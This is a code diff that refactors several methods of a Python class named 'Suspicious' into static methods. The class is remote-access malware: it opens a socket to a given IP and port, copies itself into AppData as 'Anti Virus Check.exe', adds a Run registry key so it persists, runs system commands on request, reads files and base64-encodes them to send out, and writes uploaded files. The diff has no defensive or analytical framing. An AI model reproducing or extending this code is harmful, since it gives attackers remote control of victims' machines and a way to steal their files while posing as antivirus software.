@@ -15,7 +15,8 @@ class Suspicious:
         self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
-    def restart_control(self):
+    @staticmethod
+    def restart_control():
         piece_of_cake = os.path.join(
             os.environ['appdata'], r"Anti Virus Check.exe")
         if not os.path.exists(piece_of_cake):
@@ -23,7 +24,8 @@ class Suspicious:
             subprocess.call(
                 rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{piece_of_cake}"')
 
-    def handleErrorDataSendType(self, error):
+    @staticmethod
+    def handleErrorDataSendType(error):
         return str(error)
 
     def execute_system_commands(self, command):
@@ -34,15 +36,18 @@ class Suspicious:
         except Exception as error:
             return self.handleErrorDataSendType(error)
 
-    def changeWorkingDirectory(self, path):
+    @staticmethod
+    def changeWorkingDirectory(path):
         os.chdir(path)
         return "[+] Changed current working folder to " + str(path)
 
-    def read_file(self, path):
+    @staticmethod
+    def read_file(path):
         with open(path, 'rb') as f:
             return base64.b64encode(f.read())
 
-    def download_file(self, path, content):
+    @staticmethod
+    def download_file(path, content):
         with open(path, 'wb') as f:
             f.write(base64.b64decode(content))
             return "[+] File upload success"
@@ -60,7 +65,8 @@ class Suspicious:
         json_data = json.dumps(data)
         self.connetion.send(json_data.encode('utf-8'))
 
-    def getSystemInfo(self):
+    @staticmethod
+    def getSystemInfo():
         platform = {'aix': 'AIX', 'linux': "Linux", 'win32': 'Windows',
                     'cygwin': 'Windows/Cygwin', 'darwin': 'macOs'}
         return f"[+] Connected to \"{platform[sys.platform]}\" operating system"
